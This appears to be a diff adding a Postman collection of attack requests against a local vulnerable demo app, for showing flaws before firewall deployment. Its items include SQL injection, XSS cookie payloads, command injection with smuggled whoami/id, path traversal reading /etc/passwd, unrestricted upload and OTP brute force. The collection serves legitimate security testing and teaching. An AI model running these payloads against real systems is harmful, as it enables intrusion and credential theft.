@@ -1,0 +1,467 @@
+{
+  "info": {
+    "name": "PreFirewall Lab - Vulnerability Demo Collection",
+    "description": "Complete attack collection for demonstrating vulnerabilities before firewall deployment",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+    "version": "1.0.0"
+  },
+  "variable": [
+    {
+      "key": "baseUrl",
+      "value": "http://localhost:3000",
+      "type": "string"
+    }
+  ],
+  "item": [
+    {
+      "name": "SQL Injection",
+      "item": [
+        {
+          "name": "SQLi - Classic (OR bypass)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/api/sql/users?username=admin' OR '1'='1",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "sql", "users"],
+              "query": [
+                {
+                  "key": "username",
+                  "value": "admin' OR '1'='1",
+                  "description": "SQL injection to bypass authentication"
+                }
+              ]
+            },
+            "description": "Classic SQL injection using OR clause to bypass authentication"
+          }
+        },
+        {
+          "name": "SQLi - Comment Injection",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"username\": \"admin' --\",\n  \"password\": \"anything\"\n}"
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/sql/login",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "sql", "login"]
+            },
+            "description": "SQL injection using comment (--) to bypass password check"
+          }
+        },
+        {
+          "name": "SQLi - UNION (data extraction)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/api/sql/products?id=1 UNION SELECT id,username,password,email FROM users--",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "sql", "products"],
+              "query": [
+                {
+                  "key": "id",
+                  "value": "1 UNION SELECT id,username,password,email FROM users--"
+                }
+              ]
+            },
+            "description": "UNION-based SQL injection to extract user credentials"
+          }
+        }
+      ]
+    },
+    {
+      "name": "XSS (Cross-Site Scripting)",
+      "item": [
+        {
+          "name": "XSS - Reflected (script tag)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/api/xss/search?q=<script>alert('XSS')</script>",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "xss", "search"],
+              "query": [
+                {
+                  "key": "q",
+                  "value": "<script>alert('XSS')</script>"
+                }
+              ]
+            },
+            "description": "Reflected XSS using script tag in search parameter"
+          }
+        },
+        {
+          "name": "XSS - Image onerror",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/api/xss/greet?name=<img src=x onerror=alert(document.cookie)>",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "xss", "greet"],
+              "query": [
+                {
+                  "key": "name",
+                  "value": "<img src=x onerror=alert(document.cookie)>"
+                }
+              ]
+            },
+            "description": "XSS via image tag with onerror handler to steal cookies"
+          }
+        },
+        {
+          "name": "XSS - Stored (post comment)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"username\": \"Attacker\",\n  \"comment\": \"<script>alert('Stored XSS')</script>\"\n}"
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/xss/comment",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "xss", "comment"]
+            },
+            "description": "Store malicious XSS payload in database"
+          }
+        },
+        {
+          "name": "XSS - View Comments (trigger stored XSS)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/api/xss/comments",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "xss", "comments"]
+            },
+            "description": "Trigger stored XSS by viewing comments page"
+          }
+        }
+      ]
+    },
+    {
+      "name": "Command Injection",
+      "item": [
+        {
+          "name": "Command Injection - Ping (semicolon)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"host\": \"127.0.0.1; whoami\"\n}"
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/command/ping",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "command", "ping"]
+            },
+            "description": "Command injection using semicolon to chain commands"
+          }
+        },
+        {
+          "name": "Command Injection - Lookup (pipe)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/api/command/lookup?domain=example.com | id",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "command", "lookup"],
+              "query": [
+                {
+                  "key": "domain",
+                  "value": "example.com | id"
+                }
+              ]
+            },
+            "description": "Command injection using pipe operator"
+          }
+        },
+        {
+          "name": "Command Injection - Process (command substitution)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/api/command/process?name=node$(whoami)",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "command", "process"],
+              "query": [
+                {
+                  "key": "name",
+                  "value": "node$(whoami)"
+                }
+              ]
+            },
+            "description": "Command injection using $() substitution"
+          }
+        }
+      ]
+    },
+    {
+      "name": "Path Traversal",
+      "item": [
+        {
+          "name": "Path Traversal - Download /etc/passwd",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/api/traversal/download?file=../../../../etc/passwd",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "traversal", "download"],
+              "query": [
+                {
+                  "key": "file",
+                  "value": "../../../../etc/passwd"
+                }
+              ]
+            },
+            "description": "Path traversal to read /etc/passwd"
+          }
+        },
+        {
+          "name": "Path Traversal - Absolute path",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/api/traversal/view?path=/etc/passwd",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "traversal", "view"],
+              "query": [
+                {
+                  "key": "path",
+                  "value": "/etc/passwd"
+                }
+              ]
+            },
+            "description": "Direct absolute path access to sensitive file"
+          }
+        },
+        {
+          "name": "Path Traversal - Config file",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"filename\": \"../../../package.json\"\n}"
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/traversal/config",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "traversal", "config"]
+            },
+            "description": "Path traversal to read application configuration"
+          }
+        }
+      ]
+    },
+    {
+      "name": "File Upload",
+      "item": [
+        {
+          "name": "File Upload - Unrestricted",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "formdata",
+              "formdata": [
+                {
+                  "key": "file",
+                  "type": "file",
+                  "src": "",
+                  "description": "Upload any file (try .php, .sh, .jsp)"
+                }
+              ]
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/upload/unrestricted",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "upload", "unrestricted"]
+            },
+            "description": "Upload any file type without restrictions"
+          }
+        },
+        {
+          "name": "File Upload - List uploaded files",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/api/upload/list",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "upload", "list"]
+            },
+            "description": "List all uploaded files"
+          }
+        }
+      ]
+    },
+    {
+      "name": "Brute Force / Rate Limiting",
+      "item": [
+        {
+          "name": "Brute Force - Login (no rate limit)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"username\": \"admin\",\n  \"password\": \"wrongpassword\"\n}"
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/brute/login",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "brute", "login"]
+            },
+            "description": "Unlimited login attempts - run this repeatedly"
+          }
+        },
+        {
+          "name": "Brute Force - OTP",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"username\": \"admin\",\n  \"otp\": \"123456\"\n}"
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/brute/verify-otp",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "brute", "verify-otp"]
+            },
+            "description": "Brute force 6-digit OTP without rate limiting"
+          }
+        },
+        {
+          "name": "Rate Limit - API abuse",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/api/brute/api-call",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "brute", "api-call"]
+            },
+            "description": "Call this endpoint rapidly to demonstrate lack of rate limiting"
+          }
+        },
+        {
+          "name": "Scanner Detection - sqlmap UA",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "User-Agent",
+                "value": "sqlmap/1.0"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/api/brute/admin",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "brute", "admin"]
+            },
+            "description": "Simulate scanner with sqlmap user agent - not blocked"
+          }
+        }
+      ]
+    },
+    {
+      "name": "Info Endpoints",
+      "item": [
+        {
+          "name": "Root - API Overview",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/",
+              "host": ["{{baseUrl}}"],
+              "path": [""]
+            },
+            "description": "Get API overview and available endpoints"
+          }
+        },
+        {
+          "name": "SQL Injection Info",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/api/sql",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "sql"]
+            }
+          }
+        },
+        {
+          "name": "XSS Info",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/api/xss",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "xss"]
+            }
+          }
+        },
+        {
+          "name": "Command Injection Info",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/api/command",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "command"]
+            }
+          }
+        }
+      ]
+    }
+  ]
+}
